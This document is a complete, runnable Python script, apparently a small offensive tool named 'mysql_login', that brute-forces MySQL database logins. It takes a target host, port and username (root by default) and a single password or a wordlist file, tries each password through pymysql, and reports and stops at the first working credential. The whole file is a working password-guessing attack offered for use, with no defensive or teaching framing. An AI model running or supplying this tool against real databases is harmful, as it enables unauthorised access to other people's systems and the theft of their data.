import os
import sys
import pymysql
import argparse
import datetime

def mysqlConnect(host,port,user,passwd):
    try:
        db = pymysql.connect(
            host=host,
            port=port,
            user=user,
            password=passwd,
        )
        cursor = db.cursor()
        try:
            print()
            print("[+] {} -> {}:{} --- Success: '{}':'{}' ".format(datetime.datetime.now(),host,port,user,passwd))
            flag = True
            if flag:
                exit()
        except Exception as e:
            print(e)

    except Exception as e:
        #print(e)
        print("[-] {} -> {}:{} LOGIN FAILED: '{}':'{}' ".format(datetime.datetime.now(),host,port,user,passwd))


def main():
    banner = r'''
                           .__       .__                .__        
  _____ ___.__. ___________|  |      |  |   ____   ____ |__| ____  
 /     <   |  |/  ___/ ____/  |      |  |  /  _ \ / ___\|  |/    \ 
|  Y Y  \___  |\___ < <_|  |  |__    |  |_(  <_> ) /_/  >  |   |  \
|__|_|  / ____/____  >__   |____/____|____/\____/\___  /|__|___|  /
      \/\/         \/   |__|   /_____/          /_____/         \/    v1.0
    '''
    print(banner)
    parser = argparse.ArgumentParser()
    parser.add_argument("-H","--Host",type=str, help="Enter target mysql database IP. ex: 127.0.0.1")
    parser.add_argument("-P","--Port",type=int, default=3306,help="Enter target mysql database Port. ex: 3306")
    parser.add_argument("-u","--User",type=str,default="root",help="Enter target mysql database username. ex: root")
    parser.add_argument("-p","--Passwordlist",type=str, default="123456",help="Enter target mysql database password. ex: 123456/password.txt")
    args = parser.parse_args()
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()
    
    host = args.Host
    port = args.Port
    user = args.User
    passwd = args.Passwordlist
    
    passfile = os.path.isfile(passwd)
    if passfile:
        print("passwd is a file.")
        with open(passwd) as f:
            for line in f:
                line = line.strip()
                #print(line)
                mysqlConnect(host,port,user,line)
    else:
        mysqlConnect(host,port,user,passwd)
    

if __name__ == "__main__":
    main()
